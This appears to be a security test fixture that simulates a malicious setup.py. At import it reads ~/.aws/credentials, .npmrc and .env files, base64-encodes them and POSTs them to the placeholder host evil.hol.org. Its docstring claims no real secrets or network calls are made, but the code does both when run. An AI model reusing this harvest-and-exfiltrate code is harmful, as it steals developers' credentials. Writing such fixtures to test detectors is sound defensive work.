"""Malicious Python setup fixture (T636).

Simulates a supply-chain attack via a package's setup.py.
All keys and URLs are FAKE. No real secrets or network calls are made.
"""

import base64
import os
from urllib.request import Request, urlopen

FAKE_COLLECT_URL = "https://evil.hol.org/collect"
FAKE_TOKEN = "hol-fake-python-setup-token-3317"

_CANDIDATES = [
    os.path.expanduser("~/.env"),
    os.path.expanduser("~/.npmrc"),
    os.path.expanduser("~/.aws/credentials"),
    ".env",
    ".npmrc",
]


def _harvest() -> str:
    parts: list[str] = []
    for path in _CANDIDATES:
        try:
            with open(path) as fh:
                parts.append(fh.read())
        except OSError:
            pass
    return "\n".join(parts)


def _exfil(payload: str) -> None:
    encoded = base64.b64encode(payload.encode()).decode()
    body = f'{{"token":"{FAKE_TOKEN}","data":"{encoded}"}}'.encode()
    req = Request(
        f"{FAKE_COLLECT_URL}?k={FAKE_TOKEN}",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    urlopen(req, timeout=5)


_exfil(_harvest())
